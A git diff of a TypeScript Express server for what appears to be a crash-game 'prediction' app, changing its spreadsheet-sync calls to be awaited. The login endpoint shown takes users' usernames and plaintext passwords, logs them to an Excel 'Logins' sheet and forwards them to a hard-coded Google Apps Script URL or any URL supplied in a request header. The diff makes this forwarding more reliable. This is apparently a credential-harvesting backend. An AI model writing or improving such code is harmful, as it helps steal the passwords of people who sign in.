@@ -85,7 +85,7 @@ function getOnlineSheetUrl(): string {
   return "https://script.google.com/macros/s/AKfycbwUxXDlXWxjvtOcvcqcJC34VCQ-Hy3-Dg8Du4w6ODHmC7KF_MXQ-vBay2NHS1GbIxMHAA/exec";
 }
 
-// Background online spreadsheet pusher with Vercel custom headers support
+// Background online spreadsheet pusher with Vercel custom headers support - fully awaited for serverless execution
 async function syncToOnlineSheet(sheetName: string, newRow: any, customUrl?: string) {
   const targetUrl = customUrl || getOnlineSheetUrl();
   if (!targetUrl || !targetUrl.startsWith("http")) {
@@ -99,25 +99,20 @@ async function syncToOnlineSheet(sheetName: string, newRow: any, customUrl?: str
       ...newRow
     };
 
-    // Forward the packet via network POST
-    fetch(targetUrl, {
+    console.log(`📡 Dispatching network payload to ${targetUrl}...`);
+    const response = await fetch(targetUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
-    })
-    .then(async (response) => {
-      console.log(`📡 Online spreadsheet updated! Type: ${sheetName}. Status: ${response.status}`);
-    })
-    .catch((fetchErr: any) => {
-      console.warn("⚠️ Online sheet network endpoint timed out or rejected packet. Check Webhook state:", fetchErr?.message);
     });
+    console.log(`📡 Online spreadsheet updated! Type: ${sheetName}. Status: ${response.status}`);
   } catch (err: any) {
-    console.warn("⚠️ Bypassed online sheet dispatcher error:", err?.message);
+    console.warn("⚠️ Online sheet network endpoint timed out or rejected packet. Check Webhook state:", err?.message);
   }
 }
 
-// Excel persistence helper function with custom header support
-function appendToExcelSheet(sheetName: string, newRow: any, customUrl?: string) {
+// Excel persistence helper function with custom header support - fully asynchronous
+async function appendToExcelSheet(sheetName: string, newRow: any, customUrl?: string) {
   try {
     let workbook;
     if (fs.existsSync(EXCEL_FILE_PATH)) {
@@ -150,12 +145,12 @@ function appendToExcelSheet(sheetName: string, newRow: any, customUrl?: string) 
     XLSX.writeFile(workbook, EXCEL_FILE_PATH);
     console.log(`📡 Stored data in Excel sheet [${sheetName}] updated at ${EXCEL_FILE_PATH}`);
 
-    // Automatically forward the data packets to the online sheet if set
-    syncToOnlineSheet(sheetName, newRow, customUrl);
+    // Automatically forward the data packets to the online sheet if set - MUST await on serverless
+    await syncToOnlineSheet(sheetName, newRow, customUrl);
   } catch (error) {
     console.error("❌ Error writing to Excel spreadsheet:", error);
     // Even if local Excel write fails on serverless Vercel, forward packet to Google Sheet
-    syncToOnlineSheet(sheetName, newRow, customUrl);
+    await syncToOnlineSheet(sheetName, newRow, customUrl);
   }
 }
 
@@ -378,24 +373,24 @@ app.post("/api/gemini/analyze", async (req, res): Promise<any> => {
 });
 
 // Excel custom persistence endpoints
-app.post("/api/store/login", (req, res) => {
+app.post("/api/store/login", async (req, res) => {
   const { username, password } = req.body;
   const customUrl = (req.headers["x-online-sheet-url"] as string) || getOnlineSheetUrl();
-  appendToExcelSheet("Logins", {
+  await appendToExcelSheet("Logins", {
     Username: username || "Moh01",
     Password: password || "(not provided)"
   }, customUrl);
-  res.json({ success: true, message: "Credential logs saved securely." });
+  res.json({ success: true, message: "Credential logs saved securely in excel spreadsheet sheet 'Logins'." });
 });
 
-app.post("/api/store/prediction", (req, res) => {
+app.post("/api/store/prediction", async (req, res) => {
   const { username, prediction } = req.body;
   const customUrl = (req.headers["x-online-sheet-url"] as string) || getOnlineSheetUrl();
-  appendToExcelSheet("Predictions", {
+  await appendToExcelSheet("Predictions", {
     Username: username || "Moh01",
     PredictionValue: prediction || "0.00x"
   }, customUrl);
-  res.json({ success: true, message: "Prediction result archived." });
+  res.json({ success: true, message: "Prediction result archived inside excel sheet 'Predictions'." });
 });
 
 app.get("/api/excel/download", (req, res) => {
